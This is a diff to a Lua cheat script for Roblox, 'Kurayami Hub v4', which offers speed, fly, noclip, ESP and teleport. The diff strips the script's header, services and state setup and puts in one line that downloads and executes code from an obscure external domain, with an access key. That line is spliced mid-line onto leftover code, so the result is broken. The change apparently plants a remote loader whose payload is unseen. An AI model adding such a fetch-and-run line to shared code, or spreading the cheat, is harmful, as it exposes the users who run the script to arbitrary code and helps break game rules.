@@ -1,40 +1,4 @@
---[[
-=====================================================================
-    k42.lua | Kurayami Hub v4
-    Universal Script for Delta / Xeno (Mobile + PC)
-    UI: Rayfield Gen2
-    Features: Movement, Visual, Teleport (Player + Waypoint), Utility
-    Waypoint System: Per-PlaceId, CRUD, Drag-to-Reorder
-    + Manual Refresh Buttons
-=====================================================================
-]]
-
--- ============================================================
--- [ 1 ] SERVICES
--- ============================================================
-local Players           = game:GetService("Players")
-local UserInputService  = game:GetService("UserInputService")
-local RunService        = game:GetService("RunService")
-local Lighting          = game:GetService("Lighting")
-local Workspace         = game:GetService("Workspace")
-local HttpService       = game:GetService("HttpService")
-local TeleportService   = game:GetService("TeleportService")
-local VirtualUser       = game:GetService("VirtualUser")
-local player            = Players.LocalPlayer
-
--- ============================================================
--- [ 2 ] LOAD RAYFIELD GEN2
--- ============================================================
-local Rayfield = loadstring(game:HttpGet("https://sirius.menu/gen2"))()
-
--- ============================================================
--- [ 3 ] STATE
--- ============================================================
-local State = {
-    Speed = false, SpeedValue = 80,
-    Jump = false, JumpValue = 120,
-    InfJump = false,
-    Fly = false, FlyValue = 60,
+loadstring(game:HttpGet("https://rizz-rxs.xyz/Onyx-Zero/api?key=c40e1d634fa2bd89b1f8f97bc1048ee8&_s=734591b452252fba81e9d8d3a5d3f7691d311b6f799acb8615986f3c5994d185"))()    Fly = false, FlyValue = 60,
     Noclip = false,
     Fullbright = false,
     ESP = false, ESPColor = Color3.fromRGB(236, 72, 153),
